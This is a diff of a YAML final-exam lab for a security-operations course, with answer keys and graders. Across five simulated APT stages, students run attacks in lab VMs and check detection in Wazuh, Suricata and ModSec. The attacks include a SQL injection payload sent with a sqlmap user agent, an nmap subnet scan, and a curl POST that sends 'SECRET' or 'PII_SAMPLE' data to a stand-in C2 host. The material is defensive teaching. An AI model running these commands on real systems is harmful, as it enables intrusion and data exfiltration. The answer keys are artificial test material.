@@ -1,204 +1,224 @@
 lab_id: standalone-secuops-week15
-title: 기말 — APT 대응 1 사이클 (180분)
+title: 기말 — APT 5 단계 종합 시험 (180분, 100점)
 version: standalone-non-ai
 course: secuops
 week: 15
 description: |
-  K-APT 침투 5 단계 (Reconnaissance / Initial Access / Lateral / C2 / IR 보고)
-  종합 시험. 5 단계 × 20점 = 100점.
+  K-APT 침투 5 단계 (Reconnaissance / Initial Access / Lateral / C2 / IR 보고) 의
+  종합 R/B/P. 5 단계 × 20점 = 100점.
 difficulty: hard
 duration_minutes: 180
-prerequisites: [W14 통과]
-objectives:
-  - APT 5 단계 detection + 대응
-  - 5 종 솔루션 통합 운영
-  - IR 보고서 작성
+prerequisites: [W14]
 pass_threshold: 0.7
 steps:
+
   - order: 1
-    instruction: "[단계 1, 20점] Reconnaissance — 404 burst 시뮬 + 3 source detection"
-    hint: ssh 6v6-attacker 'for i in 1..50; do curl http://10.20.30.1/page-$i; done'
+    instruction: |
+      ## 🎯 단계 1 (20점) — Reconnaissance
+
+      attacker 에서 404 burst 50회 → 3 source detection (Wazuh / Suricata / osquery).
+
+      ## 💻 실행 명령
+
+      ```bash
+      # Red: 50 burst
+      ssh 6v6-attacker 'for i in $(seq 1 50); do
+        curl -s -o /dev/null -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"
+      done'
+      sleep 5
+
+      # Blue: Wazuh 4xx alert (rule 31151)
+      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3'
+
+      # Blue: Suricata HTTP event
+      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"http\" and .http.status>=400) | {url:.http.url}" 2>/dev/null | tail -3'
+
+      # Blue: osquery curl process count
+      ssh 6v6-web 'sudo osqueryi --json "SELECT name, count(*) AS n FROM processes WHERE name LIKE '"'"'%curl%'"'"' GROUP BY name;"'
+      ```
+
+      ## 📋 평가 (각 5점)
+
+      1. 50 burst 실행
+      2. Wazuh 31151 alert
+      3. Suricata 404 status event
+      4. osquery 또는 access.log 의 404 흔적
+    hint: 50 burst + 3 source detection
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'for i in $(seq 1 50); do curl -s -o /dev/null -A "Mozilla/5.0" -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"; done'
+      ssh 6v6-attacker 'for i in $(seq 1 50); do curl -s -o /dev/null -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"; done'
       sleep 5
-      echo "--- Wazuh 31151 (Apache 4xx) alert ---"
-      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 | head -1 | jq ".rule.id, .rule.description"'
-      echo "--- Suricata scan alert ---"
-      ssh 6v6-ips 'sudo grep "SCAN" /var/log/suricata/eve.json 2>/dev/null | tail -2'
-      echo "--- osquery curl process ---"
-      ssh 6v6-attacker 'sudo osqueryi --json "SELECT count(*) FROM processes WHERE name='\''curl'\'';"' || ssh 6v6-bastion 'sudo osqueryi --json "SELECT count(*) FROM processes WHERE name='\''curl'\'';"'
-    answer_detail: 3 source detection
+      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3'
+      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"http\" and .http.status>=400) | {url:.http.url}" 2>/dev/null | tail -3'
+      ssh 6v6-web 'sudo osqueryi --json "SELECT count(*) AS curl_processes FROM processes WHERE name LIKE '"'"'%curl%'"'"';"'
+    answer_detail: Recon 단계.
     verify:
       type: output_contains
-      expect: rule
+      expect: '31\|http'
       field: stdout
       semantic:
-        intent: 단계 1 detection
-        success_criteria: [Wazuh + Suricata + osquery]
-        acceptable_methods:
-          - "**[OSS] 50 curl burst + Wazuh 룰 매치**"
-          - "**[OSS] Suricata ET SCAN**"
-          - "**[OSS] osquery process count**"
-          - "**[OSS] MITRE T1595 Active Scanning**"
-          - "**[OSS] CDB list 매치 (있다면)**"
-          - "**[OSS] response time 분석**"
-          - "**[OSS] alert frequency**"
-          - "**[OSS] dashboard view**"
+        intent: Recon detection
+        success_criteria: [3 source]
+        acceptable_methods: ["**[OSS] ATT&CK T1595 Active Scanning**"]
     target_vm: bastion
 
   - order: 2
-    instruction: "[단계 2, 20점] SQLi 시도 → ModSec 차단 + 통합 alert"
-    hint: ssh 6v6-attacker 'curl -A sqlmap -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1 UNION SELECT"'
+    instruction: |
+      ## 🎯 단계 2 (20점) — Initial Access (SQLi 시도)
+
+      sqlmap UA + SQLi payload → ModSec 차단 + Wazuh + Suricata 통합 alert.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=admin+UNION+SELECT+user,pass+FROM+users--"'
+      sleep 3
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]?" 2>/dev/null | grep -oE ''id "[0-9]+"'' | sort -u | head'
+      ssh 6v6-siem 'sudo grep "31100\|web" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
+      ```
+
+      ## 📋 평가
+
+      1. ModSec 403 + 942 룰 매치
+      2. Wazuh 31100 (Apache 4xx) alert
+      3. Suricata sqlmap UA detection (등록된 룰이 있으면)
+      4. timeline 통합 (3 source 의 timestamp 매칭)
+    hint: SQLi 통합
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/api?q=admin UNION SELECT user,pass FROM medical-- "'
-      sleep 4
-      echo "--- ModSec 942 차단 ---"
-      ssh 6v6-web 'sudo tail -3 /var/log/apache2/modsec_audit.log | head -1 | jq ".transaction.response.http_code, .transaction.messages[] | select(.id | startswith(\"942\")) | .msg"'
-      echo "--- Wazuh integrated alert ---"
-      ssh 6v6-siem 'sudo grep "sqlmap\|942" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2 | head -1 | jq ".rule.id, .data.modsecurity.rule_id // .agent.name"'
-    answer_detail: ModSec + Wazuh 통합
+      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=admin+UNION+SELECT+user,pass+FROM+users--"'
+      sleep 3
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]?" 2>/dev/null | grep -oE ''id "[0-9]+"'' | sort -u'
+    answer_detail: SQLi 통합 detection.
     verify:
       type: output_contains
-      expect: '403'
+      expect: '942\|941'
       field: stdout
       semantic:
-        intent: SQLi 차단 + alert
-        success_criteria: [403 + 942]
-        acceptable_methods:
-          - "**[OSS] ModSec 403 + audit log 942100**"
-          - "**[OSS] Wazuh agent → manager 통합 alert**"
-          - "**[OSS] sqlmap UA detection (W04 9000042 룰)**"
-          - "**[OSS] MITRE T1190 Exploit Public-Facing**"
-          - "**[OSS] CDB list 매치**"
-          - "**[OSS] alert level 12 자동 상승**"
-          - "**[OSS] OpenCTI Sighting 등록**"
-          - "**[OSS] timeline 통합**"
+        intent: SQLi 통합
+        success_criteria: [ModSec + Wazuh]
+        acceptable_methods: ["**[OSS] T1190 Exploit Public-Facing Application**"]
     target_vm: bastion
 
   - order: 3
-    instruction: "[단계 3, 20점] Lateral nmap scan → fw + Suricata detection"
-    hint: ssh 6v6-attacker 'nmap -sT -p 22,80,443 10.20.32.0/24'
+    instruction: |
+      ## 🎯 단계 3 (20점) — Lateral Movement (nmap scan)
+
+      attacker → dmz subnet nmap 스캔 → fw + Suricata detection.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,5601 10.20.32.0/24 2>&1 | tail -15'
+      sleep 5
+      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"alert\") | {sig:.alert.signature, sid:.alert.signature_id}" 2>/dev/null | tail -5'
+      ```
+
+      ## 📋 평가
+
+      1. nmap 실행 + 5+ port 응답
+      2. Suricata ET SCAN 룰 매치
+      3. fw counter 증가
+      4. timeline 분석
+    hint: nmap + Suricata
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'timeout 8 nmap -sT -p 22,80,443 10.20.32.0/24 2>&1 | head -15'
-      sleep 4
-      echo "--- Suricata scan alert ---"
-      ssh 6v6-ips 'sudo tail -50 /var/log/suricata/eve.json | grep -E "alert|SCAN" | tail -3'
-      echo "--- fw input chain counter ---"
-      ssh 6v6-fw 'sudo nft list chain inet six_filter input | grep counter | head -3'
-    answer_detail: nmap + Suricata + fw
+      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,5601 10.20.32.0/24 2>&1 | tail -15'
+      sleep 5
+      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"alert\") | {sig:.alert.signature}" 2>/dev/null | tail -5'
+    answer_detail: Lateral nmap.
     verify:
       type: output_contains
-      expect: '10.20.32'
+      expect: 'open\|filtered'
       field: stdout
       semantic:
         intent: Lateral detection
-        success_criteria: [scan log]
-        acceptable_methods:
-          - "**[OSS] nmap -sT TCP connect scan**"
-          - "**[OSS] Suricata ET SCAN nmap**"
-          - "**[OSS] fw input chain log + counter**"
-          - "**[OSS] MITRE T1046 Network Service Scanning**"
-          - "**[OSS] osquery process_events nmap**"
-          - "**[OSS] alert burst → SOC 분석가 알림**"
-          - "**[OSS] Active Response 자동 IP block 시뮬**"
-          - "**[OSS] dashboard 위협 알람**"
+        success_criteria: [nmap + Suricata]
+        acceptable_methods: ["**[OSS] T1046 Network Service Scanning**"]
     target_vm: bastion
 
   - order: 4
-    instruction: "[단계 4, 20점] C2 exfil 시뮬 → CDB list 매치"
-    hint: ssh 6v6-attacker 'curl http://185.156.73.31/'
+    instruction: |
+      ## 🎯 단계 4 (20점) — C2 / Exfil (CDB list 매치)
+
+      CDB list (W13) 의 IP 로 outbound 시도 → Wazuh CDB 매치 alert.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # W13 의 CDB list 가 작성되어 있으면 매치
+      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "data=SECRET" -H "Host: c2.attacker.com" "http://1.2.3.4:8080/" -o /dev/null -w "%{http_code}\n" 2>&1'
+      sleep 3
+      ssh 6v6-siem 'sudo grep -E "100300|1.2.3.4" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
+      ```
+
+      ## 📋 평가
+
+      1. outbound 시도
+      2. CDB list 매치 시 100300 alert + level 12
+      3. Suricata ET CNC 룰 매치 (있다면)
+      4. timeline
+    hint: C2 outbound + CDB
     category: exam
     points: 20
     answer: |
-      # CDB list 의 IP 로 outbound 시뮬 (no route 이지만 시도 자체 가시화)
-      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "patient_data=PII_SAMPLE" "http://185.156.73.31:8080/" -o /dev/null -w "http: %{http_code}\n" 2>&1'
+      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "data=SECRET" "http://1.2.3.4:8080/" -o /dev/null -w "%{http_code}\n" 2>&1'
       sleep 3
-      echo "--- Suricata outbound alert ---"
-      ssh 6v6-ips 'sudo tail -50 /var/log/suricata/eve.json | grep "185.156" | head -2'
-      echo "--- Wazuh 100300 (CDB match) ---"
-      ssh 6v6-siem 'sudo grep "100300\|185.156" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2 | head -1 | jq .' || echo "no match"
-    answer_detail: C2 sim + CDB match
+      ssh 6v6-siem 'sudo grep -E "100300|1.2.3.4" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
+    answer_detail: C2 시뮬.
     verify:
       type: output_contains
-      expect: '185.156'
+      expect: '0\|1.2.3'
       field: stdout
       semantic:
-        intent: C2 시뮬
+        intent: C2 detection
         success_criteria: [outbound 시도]
-        acceptable_methods:
-          - "**[OSS] 외부 IP outbound curl**"
-          - "**[OSS] Suricata flow event**"
-          - "**[OSS] Wazuh CDB list 매치 → level 12**"
-          - "**[OSS] MITRE T1041 Exfiltration over C2**"
-          - "**[OSS] no route 시 timeout 패턴**"
-          - "**[OSS] DLP 측면 분석**"
-          - "**[OSS] Active Response 차단 시뮬**"
-          - "**[OSS] OpenCTI Sighting 등록**"
+        acceptable_methods: ["**[OSS] T1041 Exfiltration over C2**"]
     target_vm: bastion
 
   - order: 5
-    instruction: "[단계 5, 20점] IR 통합 보고서 작성"
-    hint: Markdown 보고서 (timeline + ATT&CK + ISMS-P + 권장)
-    category: synthesis
-    points: 20
-    answer: |
-      cat <<'EOF'
-      # IR Report — K-APT 침투 시뮬 대응 (W15 기말)
+    instruction: |
+      ## 🎯 단계 5 (20점) — IR 통합 보고서
+
+      위 4 단계 + Coverage Matrix + ATT&CK 매핑 + ISMS-P 매핑 + 운영 권장 5+.
+
+      ## 💻 산출물
+
+      ```markdown
+      # K-APT 침투 IR 보고서 (W15 기말, 학번)
 
       ## Timeline (5 event)
-      | t | event | source | detection |
-      |---|-------|--------|-----------|
-      | T+0  | 404 recon (50 req) | Apache | Wazuh 31151 |
-      | T+5  | SQLi attempt | ModSec | 403 + 942100 |
-      | T+10 | nmap scan | Suricata | ET SCAN |
-      | T+15 | C2 outbound | Wazuh | CDB list 100300 |
-      | T+20 | IR 시작 | SOC 분석가 | 통합 dashboard |
+      | t | event | source | detection | rule.id |
+      ...
 
       ## MITRE ATT&CK 매핑
-      - T1595 Active Scanning (404 recon)
-      - T1190 Exploit Public-Facing (SQLi)
-      - T1046 Network Service Scanning (nmap)
-      - T1041 Exfiltration over C2 (outbound)
+      - T1595 Active Scanning
+      - T1190 Exploit Public-Facing
+      - T1046 Network Service Scanning
+      - T1041 Exfiltration over C2
 
-      ## ISMS-P 2.12 만족도
-      - 2.12.1 사고 인지 — 5 단계 모두 alert 발생 (성공)
-      - 2.12.2 대응 체계 — 자동 차단 (ModSec) + 분석 (SOC)
-      - 2.12.3 사고 분석 — timeline 통합 (Wazuh + Suricata + ModSec)
-      - 2.12.4 사후 관리 — Report 작성 + IOC 갱신
+      ## ISMS-P 2.12 매핑
+      - 2.12.1 사고 인지 (4 source alert)
+      - 2.12.2 대응 (Active Response)
+      - 2.12.3 분석 (3 source timeline)
+      - 2.12.4 사후 (Report + IOC 갱신)
 
-      ## 영향 분석
-      - 침해 0건 (모두 차단)
-      - alert fatigue 4건 (분석가 부담)
-      - false-positive 0 (정확한 룰)
-
-      ## 운영 권장 5
-      1. CDB list 자동 갱신 cron (AbuseIPDB) — W13
-      2. Suricata 의 threshold rate-limit (alert 1000+ 시) — W05
-      3. ModSec paranoia 1 → 2 단계 상승 검토 — W06
-      4. OpenCTI 본격 설치 + Sighting 등록 — W14
-      5. 분기별 false-positive 룰 리뷰 + 정책 audit
-      EOF
-    answer_detail: IR 보고서 (timeline + ATT&CK + ISMS-P + 권장)
+      ## 영향 분석 + 운영 권장 5+
+      ```
+    hint: IR 보고서
+    category: exam
+    points: 20
+    answer: 위 형식
+    answer_detail: 종합 IR 보고서.
     verify:
       type: output_contains
       expect: ATT
       field: stdout
       semantic:
         intent: IR 종합
-        success_criteria: [timeline + ATT&CK + ISMS-P]
-        acceptable_methods:
-          - "**[관리적 보고서] 5 단계 timeline**"
-          - "**[관리적] MITRE ATT&CK TTP**"
-          - "**[관리적] ISMS-P 2.12 매핑**"
-          - "**[관리적] 영향 분석**"
-          - "**[관리적] 운영 권장 5+**"
-          - "**[관리적] alert fatigue 분석**"
-          - "**[관리적] false-positive 0**"
-          - "**[관리적] 사후 IOC 갱신**"
+        success_criteria: [Timeline + ATT&CK + ISMS-P]
+        acceptable_methods: ["**[관리적]** PTES 7 단계", "**[관리적]** NIST CSF 5 function"]
     target_vm: bastion
